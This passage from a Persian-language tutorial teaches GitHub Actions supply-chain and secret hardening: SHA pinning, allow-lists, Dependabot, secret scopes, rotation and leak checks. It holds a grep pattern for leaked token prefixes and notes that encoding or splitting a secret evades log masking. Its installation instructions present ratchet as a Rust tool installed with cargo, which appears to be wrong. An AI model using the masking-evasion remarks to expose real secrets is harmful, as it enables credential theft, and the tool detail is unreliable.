- **`pull_request_target` + checkout کد PR** = نشت secret. راه‌حل: `pull_request` یا الگوی دو-مرحله‌ای.
- `persist-credentials: false` در checkout.
- `npm ci --ignore-scripts` برای dependency مشکوک.
- `zizmor` و `actionlint` برای audit خودکار.
- **همه‌ی مثال‌ها برای دفاع است؛ تست روی مخزن دیگران غیرقانونی است.**

**سؤالات مروری:**
1. چرا `${{ github.event.pull_request.title }}` در `run:` خطرناک است؟
2. چرا `pull_request_target` با checkout کد PR فاجعه است؟
3. الگوی دو-مرحله‌ای چه مشکلی را حل می‌کند؟

---

## فصل ۵۵: زنجیره‌ی تأمین — SHA pinning و allow-list

### مقدمه

workflow تو به ده‌ها action شخص ثالث وابسته است. هر action یک مخزن است که می‌تواند هر لحظه تغییر کند. اگر نگه‌دارنده‌اش حسابش هک شود (که بارها اتفاق افتاده)، نسخه‌ی جدید می‌تواند مخرب باشد.

**چرا مهم است؟** حملات زنجیره‌ی تأمین در Actions واقعی‌اند: `tj-actions/changed-files` (مارس ۲۰۲۵) یکی از معروف‌ترین‌هاست که در آن ده‌ها هزار مخزن تحت تأثیر قرار گرفتند. اگر از `@v1` استفاده می‌کردی، نسخه‌ی مخرب خودکار اجرا می‌شد.

**کاربرد عملی:** SHA pinning + allow-list + Dependabot برای actionها = دفاع سه‌لایه.

### مفاهیم اساسی

#### مشکل tag قابل تغییر

```
uses: actions/checkout@v4
```

`v4` یک **tag** است. tag می‌تواند جابه‌جا شود (force push). اگر نگه‌دارنده هک شود، مهاجم `v4` را به commit مخرب منتقل می‌کند و **همه‌ی مخزن‌هایی که `@v4` دارند** کد مخرب را اجرا می‌کنند.

#### راه‌حل: SHA کامل

```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

commit SHA **تغییرناپذیر** است. حتی اگر tag جابه‌جا شود، SHA همان commit قدیمی را می‌دهد.

**نکته:** SHA باید **کامل** باشد (۴۰ کاراکتر)، نه کوتاه.

#### سه لایه‌ی دفاع

```
۱. SHA pinning        — هر action با SHA کامل
۲. Allow-list         — فقط actionهای مجاز اجرا شوند
۳. Dependabot         — SHAها به‌روز بمانند
```

#### سیاست GitHub

از اوت ۲۰۲۵، GitHub یک سیاست سازمانی برای **اجبار SHA pinning** دارد:

```
Organization Settings → Actions → General
☑ Require actions to be pinned to a full-length commit SHA
```

یا با API:

```bash
gh api -X PUT orgs/MYORG/actions/permissions \
  -f enabled=true \
  -f allowed_actions=selected \
  -F sha_pinning_required=true
```

### مثال‌های عملی

#### مثال ۱: پیدا کردن SHA یک tag

```bash
# با git ls-remote
git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2
# 11bd71901bbe5b1630ceea73d27597364c9af683	refs/tags/v4.2.2

# توجه: برای annotated tag، باید ^{} را هم بگیری
git ls-remote https://github.com/actions/checkout 'refs/tags/v4.2.2*'

# با gh api
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha'
```

#### مثال ۲: workflow با SHA pin

```yaml
name: CI

on: [push, pull_request]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      # actions/checkout v4.2.2
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

      # actions/setup-node v4.1.0
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af
        with:
          node-version: "22"
          cache: npm

      - run: npm ci
      - run: npm test
```

**کامنت نسخه** را نگه دار — برای خوانایی و برای Dependabot.

#### مثال ۳: اتوماسیون pin کردن

`pin-actions.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail

for f in .github/workflows/*.yml .github/workflows/*.yaml; do
  [ -f "$f" ] || continue
  echo "پردازش: $f"

  # پیدا کردن uses: owner/repo@ref
  grep -oP 'uses:\s*\K[^/\s]+/[^@\s]+@[^\s#]+' "$f" | sort -u | while read -r spec; do
    repo="${spec%@*}"
    ref="${spec##*@}"

    # اگر از قبل SHA است، رد کن
    if [[ "$ref" =~ ^[0-9a-f]{40}$ ]]; then continue; fi

    sha=$(git ls-remote "https://github.com/$repo" "refs/tags/$ref" 2>/dev/null | head -1 | cut -f1)
    if [ -z "$sha" ]; then
      sha=$(git ls-remote "https://github.com/$repo" "$ref" 2>/dev/null | head -1 | cut -f1)
    fi
    if [ -z "$sha" ]; then
      echo "  ⚠️  پیدا نشد: $spec"
      continue
    fi

    # جایگزینی
    sed -i "s|$repo@$ref|$repo@$sha # $ref|g" "$f"
    echo "  ✓ $repo@$ref → ${sha:0:12}"
  done
done
```

**هشدار:** این اسکریپت ساده است. برای تولید، از `pinact` یا `ratchet` استفاده کن.

#### مثال ۴: ابزارهای pin کردن

| ابزار | کار |
|---|---|
| **`pinact`** | pin کردن + به‌روزرسانی خودکار |
| **`ratchet`** | pin + کامنت نسخه |
| **`frizbee`** | pin کردن سریع |
| **`zizmor`** | تشخیص unpinned |

```bash
# pinact
go install github.com/suzuki-shunsuke/pinact/cmd/pinact@latest
pinact run

# ratchet
cargo install ratchet
ratchet pin .github/workflows/*.yml
```

#### مثال ۵: allow-list در سازمان

```
Organization Settings → Actions → General:

☑ Allow select actions and reusable workflows
  ☑ Allow actions created by GitHub
  ☑ Allow Marketplace actions by verified creators
  ☑ Allow specified actions and reusable workflows:
      actions/*
      github/*
      docker/*
      myorg/*
```

یا با API:

```bash
gh api -X PUT orgs/MYORG/actions/permissions \
  -f enabled=true \
  -f allowed_actions=selected \
  -F sha_pinning_required=true

gh api -X PUT orgs/MYORG/actions/permissions/selected-actions \
  -f github_owned_allowed=true \
  -f verified_allowed=true \
  -f 'patterns_allowed[]=actions/*' \
  -f 'patterns_allowed[]=docker/*' \
  -f 'patterns_allowed[]=myorg/*'
```

**مزیت:** هر action خارج از لیست، اجرا نمی‌شود — حتی اگر کسی در workflow بنویسد.

#### مثال ۶: Dependabot برای actionها

`.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    commit-message:
      prefix: "ci"
    groups:
      actions:
        patterns: ["*"]
```

Dependabot PR می‌زند که SHA را به‌روز کند — با کامنت نسخه‌ی جدید. **این ترکیب طلایی است:** pin + به‌روزرسانی خودکار.

#### مثال ۷: بررسی unpinned

```bash
# پیدا کردن uses بدون SHA
grep -rn "uses:.*@v[0-9]" .github/workflows/
grep -rn "uses:.*@main" .github/workflows/
grep -rn "uses:.*@master" .github/workflows/

# با zizmor
zizmor --pedantic .github/workflows/
```

#### مثال ۸: SHA کوتاه در برابر کامل

```yaml
✗ uses: actions/checkout@11bd719    # کوتاه — کار نمی‌کند در Actions
✓ uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

Actions فقط SHA کامل را قبول می‌کند.

#### مثال ۹: reusable workflow هم pin شود

```yaml
✗ uses: myorg/.github/.github/workflows/ci.yml@main
✓ uses: myorg/.github/.github/workflows/ci.yml@a1b2c3d4e5f6...
```

reusable workflow هم می‌تواند تغییر کند — حتی مخزن خودت (اگر کسی دسترسی داشته باشد).

#### مثال ۱۰: Docker image هم pin شود

```yaml
✗ image: postgres:17
✓ image: postgres:17@sha256:abc123...
```

برای `services:` و `container:`. tag قابل تغییر است، digest نه.

### مقایسه و الگوهای مختلف

#### tag در برابر SHA در برابر branch

| | `@v4` | `@main` | `@<sha>` |
|---|---|---|---|
| تغییرناپذیر | ❌ | ❌ | ✅ |
| خوانایی | ✅ | ✅ | ❌ (نیاز به کامنت) |
| به‌روزرسانی | خودکار | خودکار | دستی/Dependabot |
| امنیت | ❌ | ❌❌ | ✅ |
| مناسب | توسعه | ❌ هرگز | ✅ تولید |

#### ابزارهای pin

| ابزار | مزیت | عیب |
|---|---|---|
| `pinact` | ساده، سریع | فقط pin |
| `ratchet` | کامنت نسخه | Rust |
| `zizmor` | audit کامل | فقط تشخیص |
| اسکریپت خودت | کنترل کامل | نگهداری |

#### allow-list: سه سطح

| سطح | انعطاف | امنیت |
|---|---|---|
| `all` | ✅ | ❌ |
| `local_only` | ❌ | ✅✅ |
| `selected` | متوسط | ✅ |

`local_only` فقط actionهای داخل همان مخزن/org را اجازه می‌دهد — امن‌ترین، ولی محدودکننده.

### اشکال شایع

#### ۱. `@v4` در تولید

شایع‌ترین. یک هک به نگه‌دارنده = کد مخرب در workflow تو.

#### ۲. SHA کوتاه

کار نمی‌کند. باید ۴۰ کاراکتر.

#### ۳. pin کردن بدون کامنت نسخه

```yaml
✗ uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
✓ uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

بدون کامنت، شش ماه بعد نمی‌دانی چه نسخه‌ای است.

#### ۴. pin کردن و فراموش کردن به‌روزرسانی

SHA pin شده و ۲ سال به‌روز نشده = آسیب‌پذیری‌های شناخته‌شده. Dependabot را روشن کن.

#### ۵. allow-list بدون `actions/*`

اگر `actions/*` را مجاز نکنی، `checkout` و `setup-node` کار نمی‌کنند.

#### ۶. Docker image با tag

```yaml
✗ image: postgres:17
✓ image: postgres:17@sha256:...
```

tag می‌تواند به image مخرب اشاره کند.

#### ۷. `uses: ./local-action` — امن است؟

بله، چون از همان commit است. ولی اگر workflow از `pull_request_target` اجرا شود و کد PR checkout شده باشد، `./local-action` هم مخرب است.

### نکات مهم (Tips & Tricks)

- **SHA کامل + کامنت نسخه** — استاندارد.
- **`sha_pinning_required` در سازمان** — اجبار، نه توصیه.
- **Dependabot برای `github-actions`** — به‌روزرسانی خودکار.
- **allow-list با `verified_allowed`** — کاهش سطح حمله.
- **`pinact` یا `ratchet`** برای اتوماسیون.
- **Docker image با digest** هم pin کن.
- **reusable workflow هم pin شود.**

### خلاصه فصل

- tag قابل تغییر است؛ SHA تغییرناپذیر.
- **`@v4` در تولید = ریسک زنجیره‌ی تأمین.**
- SHA کامل (۴۰ کاراکتر) + کامنت نسخه.
- `sha_pinning_required` در سازمان اجبار می‌کند.
- allow-list سطح حمله را کم می‌کند.
- Dependabot برای `github-actions` به‌روز نگه می‌دارد.

**سؤالات مروری:**
1. چرا `@v4` خطرناک است ولی `@<sha>` نه؟
2. چطور SHA یک tag را پیدا کنی؟
3. چرا pin کردن بدون Dependabot هم مشکل است؟

---

## فصل ۵۶: مدیریت secretها — دامنه، چرخش، پاکسازی

### مقدمه

secretها خونی هستند که در رگ‌های CI جریان دارند: کلید API، پسورد دیتابیس، توکن deploy. مدیریت اشتباه آنها شایع‌ترین علت نشت است.

**چرا مهم است؟** یک secret لو رفته می‌تواند در چند دقیقه کل زیرساخت را به خطر بیندازد. و اگر در تاریخ Git رفته باشد، پاک کردنش سخت است.

**کاربرد عملی:** این فصل سه سطح secret، چرخش، و پاکسازی را پوشش می‌دهد.

### مفاهیم اساسی

#### سه سطح secret

| سطح | دامنه | مناسب |
|---|---|---|
| **Repository** | همه‌ی workflowهای مخزن | توکن عمومی |
| **Environment** | فقط job با آن environment | کلید production |
| **Organization** | مخزن‌های انتخاب‌شده | کلید مشترک |

**قاعده:** حساس‌ترین secret را در environment بگذار (با required reviewers).

#### Secret در برابر Variable

| | Secret | Variable (`vars`) |
|---|---|---|
| نمایش | ماسک | قابل مشاهده |
| رمزنگاری | ✅ | ❌ |
| مناسب | کلید، پسورد | region، URL، نسخه |

#### محدودیت‌ها

| محدودیت | مقدار |
|---|---|
| تعداد در مخزن | ۱۰۰ |
| حجم هر secret | ۴۸KB |
| تعداد در سازمان | ۱۰۰۰ |
| دسترسی از fork | ❌ |

#### ماسک کردن

GitHub مقادیر secret را در لاگ ماسک می‌کند (`***`). ولی:

- اگر base64 کنی، ماسک نمی‌شود
- اگر بخشی را جدا کنی، ماسک نمی‌شود
- اگر در URL بگذاری، ممکن است ماسک نشود

#### `GITHUB_TOKEN` در برابر secret

`GITHUB_TOKEN` خودکار است و در `secrets` ظاهر می‌شود. ولی secret معمولی باید دستی بسازی.

### مثال‌های عملی

#### مثال ۱: ساخت secret با gh

```bash
# repository secret
gh secret set NPM_TOKEN --body "npm_xxx"

# از فایل
gh secret set DEPLOY_KEY < ~/.ssh/deploy_key

# environment secret
gh secret set PROD_KEY --env production --body "xxx"

# organization secret
gh secret set SHARED_KEY --org myorg --repos "repo1,repo2" --body "xxx"

# لیست
gh secret list
gh secret list --env production
gh secret list --org myorg

# حذف
gh secret delete OLD_KEY
```

#### مثال ۲: variable در برابر secret

```bash
gh variable set AWS_REGION --body "eu-central-1"
gh variable set NODE_VERSION --body "22"

gh secret set AWS_ROLE_ARN --body "arn:aws:iam::..."
```

```yaml
- run: echo "Region: ${{ vars.AWS_REGION }}"
- uses: aws-actions/configure-aws-credentials@<sha>
  with:
    role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
```

#### مثال ۳: secret در action

```yaml
- uses: some/action@<sha>
  with:
    token: ${{ secrets.API_TOKEN }}
```

**توجه:** action می‌تواند secret را بخواند و بفرستد. فقط به actionهای قابل اعتماد بده.

#### مثال ۴: secret در `run:` — روش امن

```yaml
- name: Deploy
  env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: ./deploy.sh
```

`deploy.sh` از `$API_TOKEN` استفاده می‌کند. امن است.

```yaml
✗ - run: ./deploy.sh --token ${{ secrets.API_TOKEN }}
```

در این حالت، اگر secret شامل کاراکتر خاص باشد یا در process list دیده شود، مشکل می‌شود. `env:` بهتر است.

#### مثال ۵: چرخش (rotation) خودکار

سناریو: کلید هر ۹۰ روز عوض شود.

```yaml
name: Rotate Secrets

on:
  schedule:
    - cron: "0 3 1 */3 *"    # هر ۳ ماه
  workflow_dispatch:

permissions:
  contents: read

jobs:
  rotate:
    runs-on: ubuntu-latest
    steps:
      - name: ساخت کلید جدید
        id: new
        env:
          ADMIN_KEY: ${{ secrets.ADMIN_KEY }}
        run: |
          NEW=$(curl -sS -X POST https://api.example.com/keys \
            -H "Authorization: Bearer $ADMIN_KEY" | jq -r .key)
          echo "::add-mask::$NEW"
          echo "key=$NEW" >> "$GITHUB_OUTPUT"

      - name: ذخیره در GitHub
        env:
          GH_TOKEN: ${{ secrets.GH_PAT_FOR_SECRETS }}
        run: |
          echo "${{ steps.new.outputs.key }}" | gh secret set API_KEY

      - name: حذف کلید قدیمی
        env:
          ADMIN_KEY: ${{ secrets.ADMIN_KEY }}
          OLD: ${{ secrets.API_KEY }}
        run: |
          curl -sS -X DELETE https://api.example.com/keys \
            -H "Authorization: Bearer $ADMIN_KEY" \
            -d "{\"key\":\"$OLD\"}"
```

**توجه:** برای تغییر secret از داخل Actions، به یک PAT با scope `secrets:write` نیاز داری — که خودش یک secret است. **دور باطل:** آن PAT را نمی‌شود خودکار چرخاند. راه‌حل بهتر: GitHub App با permission `secrets`.

#### مثال ۶: بررسی نشت در لاگ

```bash
# جست‌وجو در لاگ‌ها (اگر secret ماسک نشده)
gh run view <run-id> --log | grep -iE "ghp_|github_pat_|AKIA|sk_live_|xoxb-"
```

اگر پیدا شد، **فوراً** revoke کن.

#### مثال ۷: secret در artifact

```yaml
✗ - run: echo "${{ secrets.KEY }}" > config.json
   - uses: actions/upload-artifact@v4
     with: { name: config, path: config.json }
```

artifact قابل دانلود است — secret لو می‌رود. **هرگز secret را در artifact نگذار.**

#### مثال ۸: secret در cache

همان مشکل. cache هم قابل خواندن است (در محدوده‌ی مخزن). secret را cache نکن.

#### مثال ۹: `::add-mask::` برای مقادیر تولیدشده

```yaml
- run: |
    TOKEN=$(generate-token)
    echo "::add-mask::$TOKEN"
    echo "TOKEN=$TOKEN" >> "$GITHUB_ENV"
```

اگر مقدار در runtime تولید می‌شود (نه از secret)، `add-mask` آن را در لاگ ماسک می‌کند.

#### مثال ۱۰: استفاده از Vault به‌جای GitHub Secrets

برای سازمان‌های بالغ:

```yaml
- uses: hashicorp/vault-action@<sha>
  with:
    url: https://vault.example.com
    method: jwt
    role: github-deploy
    secrets: |
      secret/data/app api_key | API_KEY
```

مزیت: چرخش مرکزی، audit، انقضای کوتاه.

### مقایسه و الگوهای مختلف

#### سه سطح secret — جدول تصمیم

| secret | سطح |
|---|---|
| `NPM_TOKEN` (فقط publish) | Repository |
| `PROD_DB_URL` | **Environment** (production) |
| `SLACK_WEBHOOK` | Repository |
| `AWS_ROLE_ARN` | Repository (با OIDC، بدون کلید) |
| کلید مشترک چند مخزن | Organization |

#### GitHub Secrets در برابر Vault در برابر OIDC

| | GitHub Secrets | Vault | OIDC |
|---|---|---|---|
| چرخش | دستی/اسکریپت | ✅ مرکزی | ✅ خودکار |
| Audit | محدود | ✅ | ✅ (cloud) |
| پیچیدگی | کم | بالا | متوسط |
| مناسب | اکثر پروژه‌ها | سازمان بزرگ | ابرها |

#### `env:` در برابر `with:`

| | `env:` | `with:` |
|---|---|---|
| برای `run:` | ✅ | ❌ |
| برای action | ❌ | ✅ |
| امنیت | ✅ | ✅ (action می‌بیند) |

### اشکال شایع

#### ۱. secret در کد

```javascript
✗ const API_KEY = "sk_live_abc123";
✓ const API_KEY = process.env.API_KEY;
```

#### ۲. secret در `.env` که commit می‌شود

`.env` باید در `.gitignore` باشد و فقط `.env.example` commit شود (فصل ۸).

#### ۳. secret در URL

```
✗ https://api.example.com/data?token=abc123
```

URL در لاگ، در `Referer`، در تاریخچه‌ی مرورگر می‌ماند. از header استفاده کن.

#### ۴. secret در نام branch یا tag

```
✗ git checkout -b feature/abc123token
```

#### ۵. چاپ secret برای دیباگ

```yaml
✗ - run: echo "توکن: ${{ secrets.TOKEN }}"
```

ماسک می‌شود، ولی اگر در artifact/فایل برود، نه.

#### ۶. secret در `if:`

```yaml
✗ if: secrets.TOKEN != ''
```

ممنوع. از `vars` استفاده کن:

```yaml
✓ if: vars.HAS_TOKEN == 'true'
```

#### ۷. secret مشترک بین محیط‌ها

اگر staging و production یک secret دارند، تست در staging می‌تواند production را تحت تأثیر قرار دهد. **جدا کن.**

#### ۸. فراموش کردن revoke بعد از نشت

اگر secret لو رفت، فقط پاک کردن از GitHub کافی نیست. باید در **سرویس اصلی** هم revoke کنی.

#### ۹. دسترسی `secrets:write` به `GITHUB_TOKEN`

`GITHUB_TOKEN` به‌طور پیش‌فرض نمی‌تواند secret بسازد. اگر workflow به آن نیاز دارد، باید PAT/GitHub App بدهی — که ریسک را بالا می‌برد. **کمترین دسترسی.**

### نکات مهم (Tips & Tricks)

- **`environment` secret برای production** — با required reviewers.
- **`vars` برای غیرحساس** — region، URL، نسخه.
- **`env:` برای پاس دادن به `run:`** — نه `${{ }}`.
- **`::add-mask::`** برای مقادیر runtime.
- **هرگز secret در artifact/cache.**
- **OIDC جایگزین کلید ابری** — فصل ۵۳.
- **چرخش منظم** — حتی اگر خودکار نباشد، در تقویم بگذار.

### خلاصه فصل

- سه سطح: Repository، Environment، Organization.
- **Environment secret برای production** — با approval.
- `vars` برای غیرحساس، `secrets` برای حساس.
- secret در `env:` بده، نه `${{ }}` مستقیم در `run:`.
- secret در artifact/cache ممنوع.
- **اگر لو رفت: اول revoke در سرویس، بعد پاکسازی.**

**سؤالات مروری:**
1. چرا environment secret از repository secret امن‌تر است؟
2. چرا secret در artifact خطرناک است؟
3. اگر secret لو رفت، ترتیب کارها چیست؟

---

**بعدی:** [`13-CI-CD-Patterns.md`](13-CI-CD-Patterns.md)

---

## منابع و مراجع

- GitHub Docs: Security hardening for GitHub Actions — https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
- GitHub Docs: Automatic token authentication — https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication
- GitHub Docs: OpenID Connect — https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect
- GitHub Docs: Using secrets — https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions
- GitHub Blog: "Preventing pwn requests" — https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- `zizmor` (linter امنیتی Actions) — https://github.com/woodruffw/zizmor
- `pinact` — https://github.com/suzuki-shunsuke/pinact
- `ratchet` — https://github.com/sethvargo/ratchet
- `actionlint` — https://github.com/rhysd/actionlint
